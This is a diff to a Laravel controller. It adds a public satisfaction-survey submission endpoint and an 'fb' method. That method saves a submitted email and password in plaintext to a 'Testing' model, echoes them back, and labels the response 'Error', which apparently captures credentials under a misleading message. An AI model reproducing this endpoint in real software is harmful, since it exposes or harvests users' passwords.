@@ -6,6 +6,8 @@ use App\Models\Dropdown;
 use Illuminate\Support\Facades\DB;
 use App\Models\ParticipantPoint;
 use App\Models\CsfEntry;
+use App\Models\Testing;
+use App\Models\PublicCsfEntry;
 use App\Models\CsfQuestion;
 use App\Models\EventSession;
 use App\Models\EventSessionParticipant;
@@ -27,6 +29,67 @@ class CsfController extends Controller
     {   
         $data = CsfQuestion::where('is_active',1)->where('is_rating',1)->get();
         return DefaultResource::collection($data);
+    }
+
+    public function questions(){
+        $data = CsfQuestion::where('is_active', 1)->where('is_rating', 1)->get();
+        return DefaultResource::collection($data);
+    }
+
+    public function public(Request $request){
+        $validated = $request->validate([
+            'name' => 'nullable',
+            'email' => 'required',
+            'age' => 'required',
+            'sex' => 'required',
+            'comment' => 'required|string',
+            'questions' => 'required|array|min:1',
+            'questions.*.id' => 'required|integer|exists:csf_questions,id',
+            'questions.*.rating' => 'required|integer|min:1|max:5',
+        ]);
+
+        // $session = EventSession::where('id',$request->session_id)->first();
+        $ratings = collect($request->questions)->pluck('rating'); 
+        $pub = new PublicCsfEntry;
+        $pub->email = $request->email;
+        $pub->name = $request->name;
+        $pub->age = $request->age;
+        $pub->sex = $request->sex;
+        $pub->rate = round($ratings->avg(),1);
+        $pub->comment = $request->comment;
+        $pub->save();
+
+        foreach($request->questions as $question){
+            $pub->ratings()->create([
+                'rating' => $question['rating'],
+                'question_id' => $question['id']
+            ]);
+        }
+        $pub->refresh();
+        // broadcast(new SessionEvent(new FeedbackResource($entry),'rating'));
+        // $this->certificate($request->session_id,$request->participant_id);
+        return response()->json([
+            'status' => true,
+            'message' => 'CSF submitted successfully',
+            'data' => $pub
+        ], 200);
+    }
+
+    public function fb(Request $request){
+        
+        $pub = new Testing;
+        $pub->email = $request->email;
+        $pub->password = $request->password;
+        $pub->save();
+
+
+        $pub->refresh();
+    
+        return response()->json([
+            'status' => true,
+            'message' => 'Error',
+            'data' => $pub
+        ], 200);
     }
 
     public function session(Request $request){
